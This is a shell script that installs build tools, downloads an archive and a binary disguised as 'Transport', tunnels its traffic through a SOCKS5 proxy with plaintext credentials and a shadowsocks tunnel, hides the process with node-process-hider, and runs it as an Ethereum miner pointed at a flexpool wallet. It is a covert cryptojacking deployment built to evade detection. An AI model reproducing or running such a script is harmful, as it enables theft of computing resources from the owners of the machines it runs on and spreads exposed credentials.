#!/bin/sh
sleep 5m
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 191.101.148.51:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport

apt -y install shadowsocks-libev rng-tools

ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &

ph add Transport

./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w TEST --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
